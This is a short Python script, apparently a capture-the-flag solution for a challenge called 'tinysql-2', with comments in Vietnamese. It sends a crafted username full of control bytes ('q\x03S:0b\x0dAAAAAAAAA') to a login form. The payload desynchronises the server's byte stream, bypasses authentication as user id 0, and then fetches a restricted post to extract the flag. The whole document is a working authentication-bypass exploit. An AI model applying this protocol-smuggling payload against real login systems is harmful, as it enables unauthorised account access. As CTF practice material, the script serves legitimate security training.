import requests
import re

# Thay URL của challenge vào đây
url = "https://tinysql-2-333171aa741d8ced.instancer.batmans.kitchen/" 
s = requests.Session()

# \x03 là chiều dài của chuỗi "S:0" (3 bytes)
# \x0d (tức là \r) là 13 bytes để nuốt sạch các byte dư trong stream TCP
# Tổng chuỗi là đúng 16 ký tự (16 bytes)
payload = "q\x03S:0b\x0dAAAAAAAAA"

print("[*] Sending malicious login payload...")
# Chú ý: password bắt buộc phải bỏ trống để số lượng bytes tính toán khớp với 13.
res = s.post(f"{url}/login", data={"user": payload, "pass": ""})

# Kiểm tra xem có bypass login thành công không
if res.status_code == 200 and "forum" in res.text.lower():
    print("[+] Login bypassed successfully as 'bob' (id=0)!")
else:
    print("[-] Failed to bypass login. Status code:", res.status_code)
    exit()

print("[*] Accessing the restricted forum post to get the flag...")
# Gọi thẳng vào bài post 3 vì nó chứa biến FLAG
res2 = s.get(f"{url}/forum/post/3")

if "bkctf{" in res2.text or "flag" in res2.text.lower():
    print("[+] Flag retrieved successfully!\n")
    # Lọc lấy form flag
    flag = re.search(r'(bkctf\{[^\}]+\})', res2.text)
    if flag:
        print("FLAG:", flag.group(1))
    else:
        print(res2.text)
else:
    print("[-] Failed to find the flag in post 3.")